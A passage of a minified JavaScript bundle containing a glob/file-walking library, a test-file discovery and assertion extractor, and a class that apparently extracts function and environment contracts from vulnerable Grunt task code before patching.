q=z.shift();if(!q){if(U===0)H.end();return}U++,$.add(q);let Z=(L,R,j=!1)=>{if(L)return H.emit("error",L);if(Y&&!j){let F=[];for(let A of R)if(A.isSymbolicLink())F.push(A.realpath().then((O)=>O?.isUnknown()?O.lstat():O));if(F.length){Promise.all(F).then(()=>Z(null,R,!0));return}}for(let F of R)if(F&&(!W||W(F))){if(!H.write(J?F:F.fullpath()))B=!0}U--;for(let F of R){let A=F.realpathCached()||F;if(A.shouldWalk($,G))z.push(A)}if(B&&!H.flowing)H.once("drain",K);else if(!M)K()},M=!0;q.readdirCB(Z,!0),M=!1}};return K(),H}streamSync(X=this.cwd,Q={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X,X=this.cwd;let{withFileTypes:J=!0,follow:Y=!1,filter:W,walkFilter:G}=Q,H=new O7({objectMode:!0}),$=new Set;if(!W||W(X))H.write(J?X:X.fullpath());let z=[X],U=0,K=()=>{let B=!1;while(!B){let q=z.shift();if(!q){if(U===0)H.end();return}U++,$.add(q);let Z=q.readdirSync();for(let M of Z)if(!W||W(M)){if(!H.write(J?M:M.fullpath()))B=!0}U--;for(let M of Z){let L=M;if(M.isSymbolicLink()){if(!(Y&&(L=M.realpathSync())))continue;if(L.isUnknown())L.lstatSync()}if(L.shouldWalk($,G))z.push(L)}}if(B&&!H.flowing)H.once("drain",K)};return K(),H}chdir(X=this.cwd){let Q=this.cwd;this.cwd=typeof X==="string"?this.cwd.resolve(X):X,this.cwd[CC](Q)}};YJ=class YJ extends uK{sep="\\";constructor(X=process.cwd(),Q={}){let{nocase:J=!0}=Q;super(X,gK,"\\",{...Q,nocase:J});this.nocase=J;for(let Y=this.cwd;Y;Y=Y.parent)Y.nocase=this.nocase}parseRootPath(X){return gK.parse(X).root.toUpperCase()}newRoot(X){return new iW(this.rootPath,z8,void 0,this.roots,this.nocase,this.childrenCache(),{fs:X})}isAbsolute(X){return X.startsWith("/")||X.startsWith("\\")||/^[a-z]:(\/|\\)/i.test(X)}};WJ=class WJ extends uK{sep="/";constructor(X=process.cwd(),Q={}){let{nocase:J=!1}=Q;super(X,qt1,"/",{...Q,nocase:J});this.nocase=J}parseRootPath(X){return"/"}newRoot(X){return new rW(this.rootPath,z8,void 0,this.roots,this.nocase,this.childrenCache(),{fs:X})}isAbsolute(X){return X.startsWith("/")}};nW=class nW extends WJ{constructor(X=process.cwd(),Q={}){let{nocase:J=!0}=Q;super(X,{...Q,nocase:J})}};vK0=process.platform==="win32"?iW:rW,PC=process.platform==="win32"?YJ:process.platform==="darwin"?nW:WJ});class r5{#X;#Q;#G;length;#W;#H;#R;#O;#K;#$;#B=!0;constructor(X,Q,J,Y){if(!Et1(X))throw TypeError("empty pattern list");if(!Tt1(Q))throw TypeError("empty glob list");if(Q.length!==X.length)throw TypeError("mismatched pattern list and glob list lengths");if(this.length=X.length,J<0||J>=this.length)throw TypeError("index out of range");if(this.#X=X,this.#Q=Q,this.#G=J,this.#W=Y,this.#G===0){if(this.isUNC()){let[W,G,H,$,...z]=this.#X,[U,K,B,q,...Z]=this.#Q;if(z[0]==="")z.shift(),Z.shift();let M=[W,G,H,$,""].join("/"),L=[U,K,B,q,""].join("/");this.#X=[M,...z],this.#Q=[L,...Z],this.length=this.#X.length}else if(this.isDrive()||this.isAbsolute()){let[W,...G]=this.#X,[H,...$]=this.#Q;if(G[0]==="")G.shift(),$.shift();let z=W+"/",U=H+"/";this.#X=[z,...G],this.#Q=[U,...$],this.length=this.#X.length}}}pattern(){return this.#X[this.#G]}isString(){return typeof this.#X[this.#G]==="string"}isGlobstar(){return this.#X[this.#G]===M9}isRegExp(){return this.#X[this.#G]instanceof RegExp}globString(){return this.#R=this.#R||(this.#G===0?this.isAbsolute()?this.#Q[0]+this.#Q.slice(1).join("/"):this.#Q.join("/"):this.#Q.slice(this.#G).join("/"))}hasMore(){return this.length>this.#G+1}rest(){if(this.#H!==void 0)return this.#H;if(!this.hasMore())return this.#H=null;return this.#H=new r5(this.#X,this.#Q,this.#G+1,this.#W),this.#H.#$=this.#$,this.#H.#K=this.#K,this.#H.#O=this.#O,this.#H}isUNC(){let X=this.#X;return this.#K!==void 0?this.#K:this.#K=this.#W==="win32"&&this.#G===0&&X[0]===""&&X[1]===""&&typeof X[2]==="string"&&!!X[2]&&typeof X[3]==="string"&&!!X[3]}isDrive(){let X=this.#X;return this.#O!==void 0?this.#O:this.#O=this.#W==="win32"&&this.#G===0&&this.length>1&&typeof X[0]==="string"&&/^[a-z]:$/i.test(X[0])}isAbsolute(){let X=this.#X;return this.#$!==void 0?this.#$:this.#$=X[0]===""&&X.length>1||this.isDrive()||this.isUNC()}root(){let X=this.#X[0];return typeof X==="string"&&this.isAbsolute()&&this.#G===0?X:""}checkFollowGlobstar(){return!(this.#G===0||!this.isGlobstar()||!this.#B)}markFollowGlobstar(){if(this.#G===0||!this.isGlobstar()||!this.#B)return!1;return this.#B=!1,!0}}var Et1=(X)=>X.length>=1,Tt1=(X)=>X.length>=1;var cK=$1(()=>{PX()});class GJ{relative;relativeChildren;absolute;absoluteChildren;platform;mmopts;constructor(X,{nobrace:Q,nocase:J,noext:Y,noglobstar:W,platform:G=_t1}){this.relative=[],this.absolute=[],this.relativeChildren=[],this.absoluteChildren=[],this.platform=G,this.mmopts={dot:!0,nobrace:Q,nocase:J,noext:Y,noglobstar:W,optimizationLevel:2,platform:G,nocomment:!0,nonegate:!0};for(let H of X)this.add(H)}add(X){let Q=new q6(X,this.mmopts);for(let J=0;J<Q.set.length;J++){let Y=Q.set[J],W=Q.globParts[J];if(!Y||!W)throw Error("invalid pattern object");while(Y[0]==="."&&W[0]===".")Y.shift(),W.shift();let G=new r5(Y,W,0,this.platform),H=new q6(G.globString(),this.mmopts),$=W[W.length-1]==="**",z=G.isAbsolute();if(z)this.absolute.push(H);else this.relative.push(H);if($)if(z)this.absoluteChildren.push(H);else this.relativeChildren.push(H)}}ignored(X){let Q=X.fullpath(),J=`${Q}/`,Y=X.relative()||".",W=`${Y}/`;for(let G of this.relative)if(G.match(Y)||G.match(W))return!0;for(let G of this.absolute)if(G.match(Q)||G.match(J))return!0;return!1}childrenIgnored(X){let Q=X.fullpath()+"/",J=(X.relative()||".")+"/";for(let Y of this.relativeChildren)if(Y.match(J))return!0;for(let Y of this.absoluteChildren)if(Y.match(Q))return!0;return!1}}var _t1;var lK=$1(()=>{PX();cK();_t1=typeof process==="object"&&process&&typeof process.platform==="string"?process.platform:"linux"});class pK{store;constructor(X=new Map){this.store=X}copy(){return new pK(new Map(this.store))}hasWalked(X,Q){return this.store.get(X.fullpath())?.has(Q.globString())}storeWalked(X,Q){let J=X.fullpath(),Y=this.store.get(J);if(Y)Y.add(Q.globString());else this.store.set(J,new Set([Q.globString()]))}}class EC{store=new Map;add(X,Q,J){let Y=(Q?2:0)|(J?1:0),W=this.store.get(X);this.store.set(X,W===void 0?Y:Y&W)}entries(){return[...this.store.entries()].map(([X,Q])=>[X,!!(Q&2),!!(Q&1)])}}class TC{store=new Map;add(X,Q){if(!X.canReaddir())return;let J=this.store.get(X);if(J){if(!J.find((Y)=>Y.globString()===Q.globString()))J.push(Q)}else this.store.set(X,[Q])}get(X){let Q=this.store.get(X);if(!Q)throw Error("attempting to walk unknown path");return Q}entries(){return this.keys().map((X)=>[X,this.store.get(X)])}keys(){return[...this.store.keys()].filter((X)=>X.canReaddir())}}class HJ{hasWalkedCache;matches=new EC;subwalks=new TC;patterns;follow;dot;opts;constructor(X,Q){this.opts=X,this.follow=!!X.follow,this.dot=!!X.dot,this.hasWalkedCache=Q?Q.copy():new pK}processPatterns(X,Q){this.patterns=Q;let J=Q.map((Y)=>[X,Y]);for(let[Y,W]of J){this.hasWalkedCache.storeWalked(Y,W);let G=W.root(),H=W.isAbsolute()&&this.opts.absolute!==!1;if(G){Y=Y.resolve(G==="/"&&this.opts.root!==void 0?this.opts.root:G);let K=W.rest();if(!K){this.matches.add(Y,!0,!1);continue}else W=K}if(Y.isENOENT())continue;let $,z,U=!1;while(typeof($=W.pattern())==="string"&&(z=W.rest()))Y=Y.resolve($),W=z,U=!0;if($=W.pattern(),z=W.rest(),U){if(this.hasWalkedCache.hasWalked(Y,W))continue;this.hasWalkedCache.storeWalked(Y,W)}if(typeof $==="string"){let K=$===".."||$===""||$===".";this.matches.add(Y.resolve($),H,K);continue}else if($===M9){if(!Y.isSymbolicLink()||this.follow||W.checkFollowGlobstar())this.subwalks.add(Y,W);let K=z?.pattern(),B=z?.rest();if(!z||(K===""||K===".")&&!B)this.matches.add(Y,H,K===""||K===".");else if(K===".."){let q=Y.parent||Y;if(!B)this.matches.add(q,H,!0);else if(!this.hasWalkedCache.hasWalked(q,B))this.subwalks.add(q,B)}}else if($ instanceof RegExp)this.subwalks.add(Y,W)}return this}subwalkTargets(){return this.subwalks.keys()}child(){return new HJ(this.opts,this.hasWalkedCache)}filterEntries(X,Q){let J=this.subwalks.get(X),Y=this.child();for(let W of Q)for(let G of J){let H=G.isAbsolute(),$=G.pattern(),z=G.rest();if($===M9)Y.testGlobstar(W,G,z,H);else if($ instanceof RegExp)Y.testRegExp(W,$,z,H);else Y.testString(W,$,z,H)}return Y}testGlobstar(X,Q,J,Y){if(this.dot||!X.name.startsWith(".")){if(!Q.hasMore())this.matches.add(X,Y,!1);if(X.canReaddir()){if(this.follow||!X.isSymbolicLink())this.subwalks.add(X,Q);else if(X.isSymbolicLink()){if(J&&Q.checkFollowGlobstar())this.subwalks.add(X,J);else if(Q.markFollowGlobstar())this.subwalks.add(X,Q)}}}if(J){let W=J.pattern();if(typeof W==="string"&&W!==".."&&W!==""&&W!==".")this.testString(X,W,J.rest(),Y);else if(W===".."){let G=X.parent||X;this.subwalks.add(G,J)}else if(W instanceof RegExp)this.testRegExp(X,W,J.rest(),Y)}}testRegExp(X,Q,J,Y){if(!Q.test(X.name))return;if(!J)this.matches.add(X,Y,!1);else this.subwalks.add(X,J)}testString(X,Q,J,Y){if(!X.isNamed(Q))return;if(!J)this.matches.add(X,Y,!1);else this.subwalks.add(X,J)}}var _C=$1(()=>{PX()});class dK{path;patterns;opts;seen=new Set;paused=!1;aborted=!1;#X=[];#Q;#G;signal;maxDepth;includeChildMatches;constructor(X,Q,J){if(this.patterns=X,this.path=Q,this.opts=J,this.#G=!J.posix&&J.platform==="win32"?"\\":"/",this.includeChildMatches=J.includeChildMatches!==!1,J.ignore||!this.includeChildMatches){if(this.#Q=kt1(J.ignore??[],J),!this.includeChildMatches&&typeof this.#Q.add!=="function")throw Error("cannot ignore child matches, ignore lacks add() method.")}if(this.maxDepth=J.maxDepth||1/0,J.signal)this.signal=J.signal,this.signal.addEventListener("abort",()=>{this.#X.length=0})}#W(X){return this.seen.has(X)||!!this.#Q?.ignored?.(X)}#H(X){return!!this.#Q?.childrenIgnored?.(X)}pause(){this.paused=!0}resume(){if(this.signal?.aborted)return;this.paused=!1;let X=void 0;while(!this.paused&&(X=this.#X.shift()))X()}onResume(X){if(this.signal?.aborted)return;if(!this.paused)X();else this.#X.push(X)}async matchCheck(X,Q){if(Q&&this.opts.nodir)return;let J;if(this.opts.realpath){if(J=X.realpathCached()||await X.realpath(),!J)return;X=J}let W=X.isUnknown()||this.opts.stat?await X.lstat():X;if(this.opts.follow&&this.opts.nodir&&W?.isSymbolicLink()){let G=await W.realpath();if(G&&(G.isUnknown()||this.opts.stat))await G.lstat()}return this.matchCheckTest(W,Q)}matchCheckTest(X,Q){return X&&(this.maxDepth===1/0||X.depth()<=this.maxDepth)&&(!Q||X.canReaddir())&&(!this.opts.nodir||!X.isDirectory())&&(!this.opts.nodir||!this.opts.follow||!X.isSymbolicLink()||!X.realpathCached()?.isDirectory())&&!this.#W(X)?X:void 0}matchCheckSync(X,Q){if(Q&&this.opts.nodir)return;let J;if(this.opts.realpath){if(J=X.realpathCached()||X.realpathSync(),!J)return;X=J}let W=X.isUnknown()||this.opts.stat?X.lstatSync():X;if(this.opts.follow&&this.opts.nodir&&W?.isSymbolicLink()){let G=W.realpathSync();if(G&&(G?.isUnknown()||this.opts.stat))G.lstatSync()}return this.matchCheckTest(W,Q)}matchFinish(X,Q){if(this.#W(X))return;if(!this.includeChildMatches&&this.#Q?.add){let W=`${X.relativePosix()}/**`;this.#Q.add(W)}let J=this.opts.absolute===void 0?Q:this.opts.absolute;this.seen.add(X);let Y=this.opts.mark&&X.isDirectory()?this.#G:"";if(this.opts.withFileTypes)this.matchEmit(X);else if(J){let W=this.opts.posix?X.fullpathPosix():X.fullpath();this.matchEmit(W+Y)}else{let W=this.opts.posix?X.relativePosix():X.relative(),G=this.opts.dotRelative&&!W.startsWith(".."+this.#G)?"."+this.#G:"";this.matchEmit(!W?"."+Y:G+W+Y)}}async match(X,Q,J){let Y=await this.matchCheck(X,J);if(Y)this.matchFinish(Y,Q)}matchSync(X,Q,J){let Y=this.matchCheckSync(X,J);if(Y)this.matchFinish(Y,Q)}walkCB(X,Q,J){if(this.signal?.aborted)J();this.walkCB2(X,Q,new HJ(this.opts),J)}walkCB2(X,Q,J,Y){if(this.#H(X))return Y();if(this.signal?.aborted)Y();if(this.paused){this.onResume(()=>this.walkCB2(X,Q,J,Y));return}J.processPatterns(X,Q);let W=1,G=()=>{if(--W===0)Y()};for(let[H,$,z]of J.matches.entries()){if(this.#W(H))continue;W++,this.match(H,$,z).then(()=>G())}for(let H of J.subwalkTargets()){if(this.maxDepth!==1/0&&H.depth()>=this.maxDepth)continue;W++;let $=H.readdirCached();if(H.calledReaddir())this.walkCB3(H,$,J,G);else H.readdirCB((z,U)=>this.walkCB3(H,U,J,G),!0)}G()}walkCB3(X,Q,J,Y){J=J.filterEntries(X,Q);let W=1,G=()=>{if(--W===0)Y()};for(let[H,$,z]of J.matches.entries()){if(this.#W(H))continue;W++,this.match(H,$,z).then(()=>G())}for(let[H,$]of J.subwalks.entries())W++,this.walkCB2(H,$,J.child(),G);G()}walkCBSync(X,Q,J){if(this.signal?.aborted)J();this.walkCB2Sync(X,Q,new HJ(this.opts),J)}walkCB2Sync(X,Q,J,Y){if(this.#H(X))return Y();if(this.signal?.aborted)Y();if(this.paused){this.onResume(()=>this.walkCB2Sync(X,Q,J,Y));return}J.processPatterns(X,Q);let W=1,G=()=>{if(--W===0)Y()};for(let[H,$,z]of J.matches.entries()){if(this.#W(H))continue;this.matchSync(H,$,z)}for(let H of J.subwalkTargets()){if(this.maxDepth!==1/0&&H.depth()>=this.maxDepth)continue;W++;let $=H.readdirSync();this.walkCB3Sync(H,$,J,G)}G()}walkCB3Sync(X,Q,J,Y){J=J.filterEntries(X,Q);let W=1,G=()=>{if(--W===0)Y()};for(let[H,$,z]of J.matches.entries()){if(this.#W(H))continue;this.matchSync(H,$,z)}for(let[H,$]of J.subwalks.entries())W++,this.walkCB2Sync(H,$,J.child(),G);G()}}var kt1=(X,Q)=>typeof X==="string"?new GJ([X],Q):Array.isArray(X)?new GJ(X,Q):X,aW,oW;var kC=$1(()=>{fK();lK();_C();aW=class aW extends dK{matches=new Set;constructor(X,Q,J){super(X,Q,J)}matchEmit(X){this.matches.add(X)}async walk(){if(this.signal?.aborted)throw this.signal.reason;if(this.path.isUnknown())await this.path.lstat();return await new Promise((X,Q)=>{this.walkCB(this.path,this.patterns,()=>{if(this.signal?.aborted)Q(this.signal.reason);else X(this.matches)})}),this.matches}walkSync(){if(this.signal?.aborted)throw this.signal.reason;if(this.path.isUnknown())this.path.lstatSync();return this.walkCBSync(this.path,this.patterns,()=>{if(this.signal?.aborted)throw this.signal.reason}),this.matches}};oW=class oW extends dK{results;constructor(X,Q,J){super(X,Q,J);this.results=new O7({signal:this.signal,objectMode:!0}),this.results.on("drain",()=>this.resume()),this.results.on("resume",()=>this.resume())}matchEmit(X){if(this.results.write(X),!this.results.flowing)this.pause()}stream(){let X=this.path;if(X.isUnknown())X.lstat().then(()=>{this.walkCB(X,this.patterns,()=>this.results.end())});else this.walkCB(X,this.patterns,()=>this.results.end());return this.results}streamSync(){if(this.path.isUnknown())this.path.lstatSync();return this.walkCBSync(this.path,this.patterns,()=>this.results.end()),this.results}}});import{fileURLToPath as bt1}from"node:url";var vt1,j6;var iK=$1(()=>{PX();SC();cK();kC();vt1=typeof process==="object"&&process&&typeof process.platform==="string"?process.platform:"linux";j6=class j6{absolute;cwd;root;dot;dotRelative;follow;ignore;magicalBraces;mark;matchBase;maxDepth;nobrace;nocase;nodir;noext;noglobstar;pattern;platform;realpath;scurry;stat;signal;windowsPathsNoEscape;withFileTypes;includeChildMatches;opts;patterns;constructor(X,Q){if(!Q)throw TypeError("glob options required");if(this.withFileTypes=!!Q.withFileTypes,this.signal=Q.signal,this.follow=!!Q.follow,this.dot=!!Q.dot,this.dotRelative=!!Q.dotRelative,this.nodir=!!Q.nodir,this.mark=!!Q.mark,!Q.cwd)this.cwd="";else if(Q.cwd instanceof URL||Q.cwd.startsWith("file://"))Q.cwd=bt1(Q.cwd);if(this.cwd=Q.cwd||"",this.root=Q.root,this.magicalBraces=!!Q.magicalBraces,this.nobrace=!!Q.nobrace,this.noext=!!Q.noext,this.realpath=!!Q.realpath,this.absolute=Q.absolute,this.includeChildMatches=Q.includeChildMatches!==!1,this.noglobstar=!!Q.noglobstar,this.matchBase=!!Q.matchBase,this.maxDepth=typeof Q.maxDepth==="number"?Q.maxDepth:1/0,this.stat=!!Q.stat,this.ignore=Q.ignore,this.withFileTypes&&this.absolute!==void 0)throw Error("cannot set absolute and withFileTypes:true");if(typeof X==="string")X=[X];if(this.windowsPathsNoEscape=!!Q.windowsPathsNoEscape||Q.allowWindowsEscape===!1,this.windowsPathsNoEscape)X=X.map(($)=>$.replace(/\\/g,"/"));if(this.matchBase){if(Q.noglobstar)throw TypeError("base matching requires globstar");X=X.map(($)=>$.includes("/")?$:`./**/${$}`)}if(this.pattern=X,this.platform=Q.platform||vt1,this.opts={...Q,platform:this.platform},Q.scurry){if(this.scurry=Q.scurry,Q.nocase!==void 0&&Q.nocase!==Q.scurry.nocase)throw Error("nocase option contradicts provided scurry option")}else{let $=Q.platform==="win32"?YJ:Q.platform==="darwin"?nW:Q.platform?WJ:PC;this.scurry=new $(this.cwd,{nocase:Q.nocase,fs:Q.fs})}this.nocase=this.scurry.nocase;let J=this.platform==="darwin"||this.platform==="win32",Y={...Q,dot:this.dot,matchBase:this.matchBase,nobrace:this.nobrace,nocase:this.nocase,nocaseMagicOnly:J,nocomment:!0,noext:this.noext,nonegate:!0,optimizationLevel:2,platform:this.platform,windowsPathsNoEscape:this.windowsPathsNoEscape,debug:!!this.opts.debug},W=this.pattern.map(($)=>new q6($,Y)),[G,H]=W.reduce(($,z)=>{return $[0].push(...z.set),$[1].push(...z.globParts),$},[[],[]]);this.patterns=G.map(($,z)=>{let U=H[z];if(!U)throw Error("invalid pattern object");return new r5($,U,0,this.platform)})}async walk(){return[...await new aW(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).walk()]}walkSync(){return[...new aW(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).walkSync()]}stream(){return new oW(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).stream()}streamSync(){return new oW(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).streamSync()}iterateSync(){return this.streamSync()[Symbol.iterator]()}[Symbol.iterator](){return this.iterateSync()}iterate(){return this.stream()[Symbol.asyncIterator]()}[Symbol.asyncIterator](){return this.iterate()}}});var rK=(X,Q={})=>{if(!Array.isArray(X))X=[X];for(let J of X)if(new q6(J,Q).hasMagic())return!0;return!1};var nK=$1(()=>{PX()});function sW(X,Q={}){return new j6(X,Q).streamSync()}function xC(X,Q={}){return new j6(X,Q).stream()}function fC(X,Q={}){return new j6(X,Q).walkSync()}async function bC(X,Q={}){return new j6(X,Q).walk()}function tW(X,Q={}){return new j6(X,Q).iterateSync()}function hC(X,Q={}){return new j6(X,Q).iterate()}var xt1,ft1,ht1,yt1,gt1,vC;var yC=$1(()=>{PX();iK();nK();PX();iK();nK();lK();xt1=sW,ft1=Object.assign(xC,{sync:sW}),ht1=tW,yt1=Object.assign(hC,{sync:tW}),gt1=Object.assign(fC,{stream:sW,iterate:tW}),vC=Object.assign(bC,{glob:bC,globSync:fC,sync:gt1,globStream:xC,stream:ft1,globStreamSync:sW,streamSync:xt1,globIterate:hC,iterate:yt1,globIterateSync:tW,iterateSync:ht1,Glob:j6,hasMagic:rK,escape:l5,unescape:f6});vC.glob=vC});import{promises as mt1}from"fs";import*as c8 from"path";class aK{defaultIncludePatterns=["**/*.test.js","**/*.test.ts","**/*.spec.js","**/*.spec.ts","**/test/**/*.js","**/test/**/*.ts","**/tests/**/*.js","**/tests/**/*.ts","**/__tests__/**/*.js","**/__tests__/**/*.ts"];defaultExcludePatterns=["**/node_modules/**","**/dist/**","**/build/**","**/.git/**","**/coverage/**","**/*.broken.*","**/*.skip.*"];async discoverTests(X){let Q=X.includePatterns||this.defaultIncludePatterns,J=X.excludePatterns||this.defaultExcludePatterns,Y=[];for(let W of Q){let G=new j6(W,{cwd:X.rootDir,ignore:J,absolute:!0,maxDepth:X.maxDepth||10});for await(let H of G)try{let $=await this.analyzeTestFile(H,X.analyzeContent!==!1);if($)Y.push($)}catch($){console.warn(`Failed to analyze test file ${H}:`,$)}}return Y}async analyzeTestFile(X,Q){try{let J=await mt1.readFile(X,"utf-8"),Y=this.detectTestFramework(J),W=[],G=[];if(Q)W=this.extractTestCases(J,Y),G=this.extractRelatedFiles(J,X);return{path:X,content:J,testFramework:Y,testCases:W,relatedFiles:G}}catch(J){return console.warn(`Cannot read test file ${X}:`,J),null}}detectTestFramework(X){if(X.includes("from 'vitest'")||X.includes('from "vitest"'))return"vitest";if(X.includes("from '@jest/globals'")||X.includes("jest."))return"jest";if(X.includes("describe(")&&X.includes("it("))return"jest";if(X.includes("from 'mocha'")||X.includes("require('mocha')"))return"mocha";if(X.includes("from 'jasmine'")||X.includes("require('jasmine')"))return"jasmine";if(X.includes("from 'tap'")||X.includes("require('tap')"))return"tap";return"unknown"}extractTestCases(X,Q){let J=[],Y=this.extractTestBlocks(X);for(let W of Y){let G={name:W.name,description:W.description,functionUnderTest:this.extractFunctionUnderTest(W.content),behavioralExpectations:this.extractBehavioralExpectations(W.content),assertions:this.extractAssertions(W.content,Q)};J.push(G)}return J}extractTestBlocks(X){let Q=[],J=[/(?:it|test)\s*\(\s*['"`]([^'"`]+)['"`]\s*,?\s*(?:async\s+)?\s*\(\s*\)\s*=>\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}/g,/(?:it|test)\s*\(\s*['"`]([^'"`]+)['"`]\s*,?\s*(?:async\s+)?function\s*\(\s*\)\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}/g,/describe\s*\(\s*['"`]([^'"`]+)['"`]\s*,?\s*\(\s*\)\s*=>\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}/g];for(let Y of J){let W;while((W=Y.exec(X))!==null)Q.push({name:W[1],description:W[1],content:W[2]})}return Q}extractFunctionUnderTest(X){let Q=[/(?:const|let|var)\s+\w+\s*=\s*(?:await\s+)?(\w+)\s*\(/g,/expect\s*\(\s*(\w+)\s*\(/g,/(\w+)\s*\.\s*\w+\s*\(/g];for(let J of Q){let Y=J.exec(X);if(Y&&Y[1]&&!["expect","jest","vi","sinon"].includes(Y[1]))return Y[1]}return}extractBehavioralExpectations(X){let Q=[];if(X.includes("function(")||X.includes("=>"))Q.push({type:"function-signature",description:"Function signature must be preserved",requirement:"Parameter names and count should remain consistent",critical:!0});if(X.includes("done()")||X.includes("callback("))Q.push({type:"callback-pattern",description:"Callback behavior must be maintained",requirement:"Callback signature and timing should be preserved",critical:!0});if(X.includes("process.platform")||X.includes("win32"))Q.push({type:"platform-compatibility",description:"Platform-specific behavior must work correctly",requirement:"Cross-platform compatibility should be maintained",critical:!1});if(X.includes("try {")||X.includes("catch")||X.includes("throw"))Q.push({type:"error-handling",description:"Error handling behavior must be preserved",requirement:"Error types and handling patterns should remain consistent",critical:!1});return Q}extractAssertions(X,Q){let J=[],Y=/expect\s*\(\s*([^)]+)\s*\)\s*\.([^(]+)\s*\(\s*([^)]*)\s*\)/g,W;while((W=Y.exec(X))!==null){let G=W[1].trim(),H=W[2].trim(),$=W[3].trim(),z="equals";if(H.includes("toBe")||H.includes("toEqual"))z="equals";else if(H.includes("toContain"))z="contains";else if(H.includes("toThrow"))z="throws";else if(H.includes("toHaveBeenCalled"))z="calls";J.push({type:z,target:G,expected:$,description:`${G} should ${H} ${$}`})}return J}extractRelatedFiles(X,Q){let J=[],Y=c8.dirname(Q),W=[/import\s+.*\s+from\s+['"`]([^'"`]+)['"`]/g,/require\s*\(\s*['"`]([^'"`]+)['"`]\s*\)/g];for(let G of W){let H;while((H=G.exec(X))!==null){let $=H[1];if($.startsWith(".")){let z=c8.resolve(Y,$);J.push(z)}else if(!$.includes("node_modules")&&!$.includes("@"))J.push($)}}return J}async findTestsForFile(X,Q){return(await this.discoverTests(Q)).filter((Y)=>{let W=c8.basename(X,c8.extname(X));if(c8.basename(Y.path).includes(W))return!0;return Y.relatedFiles.some((H)=>H.includes(W)||H===X)})}extractBehavioralContracts(X){let Q=[];for(let Y of X)for(let W of Y.testCases)Q.push(...W.behavioralExpectations);return Q.filter((Y,W,G)=>W===G.findIndex((H)=>H.type===Y.type&&H.requirement===Y.requirement))}}var gC=$1(()=>{yC()});class oK{async extractFromVulnerableCode(X,Q){if(X.includes("Gruntfile")||Q.includes("grunt.registerTask"))return this.extractGruntTaskContract(Q);return this.extractGeneralContract(Q)}extractFromTests(X){let Q=[];for(let J of X)for(let Y of J.testCases){let W=this.buildContractFromTestCase(Y,J.content);if(W)Q.push(W)}return Q}extractGruntTaskContract(X){let Q=X.match(/grunt\.registerTask\s*\(\s*["']([^"']+)["']\s*,\s*["']([^"']+)["']\s*,\s*function\s*\(\s*([^)]*)\s*\)/),J={name:"unknown-task",parameters:[],returnType:"void"};if(Q){let Y=Q[1],W=Q[3].split(",").map((G)=>G.trim()).filter((G)=>G.length>0);J={name:Y,parameters:W.map((G)=>({name:G,type:"string | undefined",optional:!0,validation:["Can be any string","Used as parameter override"]})),returnType:"void",callbackPattern:this.extractCallbackPattern(X)}}return{functionSignature:J,environmentHandling:this.extractEnvironmentHandling(X),platformCompatibility:this.extractPlatformCompatibility(X),errorHandling:this.extractErrorHandling(X),loggingBehavior:this.extractLoggingBehavior(X),integrationPoints:this.extractIntegrationPoints(X,"grunt-task")}}extractGeneralContract(X){return{functionSignature:this.extractFunctionSignature(X),environmentHandling:this.extractEnvironmentHandling(X),platformCompatibility:this.extractPlatformCompatibility(X),errorHandling:this.extractErrorHandling(X),loggingBehavior:this.extractLoggingBehavior(X),integrationPoints:this.extractIntegrationPoints(X,"general")}}extractFunctionSignature(X){let Q=[/function\s+(\w+)\s*\(\s*([^)]*)\s*\)/,/const\s+(\w+)\s*=\s*\(\s*([^)]*)\s*\)\s*=>/,/(\w+)\s*:\s*\(\s*([^)]*)\s*\)\s*=>/];for(let J of Q){let Y=X.match(J);if(Y){let W=Y[1],G=Y[2].split(",").map((H)=>H.trim()).filter((H)=>H.length>0);return{name:W,parameters:G.map((H)=>({name:H.split(":")[0].trim(),type:H.includes(":")?H.split(":")[1].trim():"any",optional:H.includes("?")||H.includes("=")})),returnType:this.inferReturnType(X),callbackPattern:this.extractCallbackPattern(X)}}}return{name:"unknown-function",parameters:[],returnType:"void"}}extractCallbackPattern(X){if(X.includes("this.async()")){let J=X.match(/done\s*\(\s*([^)]*)\s*\)/g),Y=J?J[0].match(/done\s*\(\s*([^)]*)\s*\)/)?.[1].split(",").map((W)=>W.trim()).filter((W)=>W.length>0)||[]:[];return{name:"done",signature:"this.async()",expectedArgs:Y,behavior:Y.length===0?"Signal task completion without success/failure indication":"Signal task completion with result parameters"}}let Q=X.match(/(\w+)\s*\(\s*([^)]*)\s*\).*callback/);if(Q)return{name:Q[1],signature:Q[0],expectedArgs:Q[2].split(",").map((J)=>J.trim()).filter((J)=>J.length>0),behavior:"Standard callback pattern"};return}extractEnvironmentHandling(X){let Q=[],J=[],Y="development",W="No explicit validation";if(X.includes("process.env.NODE_ENV"))Q.push("process.env.NODE_ENV"),J.push("process.env.NODE_ENV");let G=/(?:var|let|const)\s+\w+\s*=\s*([^;]+);/g,H;while((H=G.exec(X))!==null){let $=H[1];if($.includes("||"))$.split("||").map((U)=>U.trim()).forEach((U)=>{if(U.includes("process.env")){if(!Q.includes(U))Q.push(U);if(!J.includes(U))J.push(U)}else if(U.includes("arg")||U.includes("environment")){if(!Q.includes("arg parameter"))Q.push("arg parameter");if(!J.includes("arg"))J.push("arg")}else if(U.includes('"')||U.includes("'")){if(Y=U.replace(/["']/g,""),!J.includes(Y))J.push(Y)}}),W="Uses first truthy value in precedence order"}return{defaultEnvironment:Y,environmentSources:Q,precedenceOrder:J,validationLogic:W}}extractPlatformCompatibility(X){let Q=X.includes("process.platform")&&X.includes("win32"),J="No platform-specific logic detected",Y="";if(Q){let 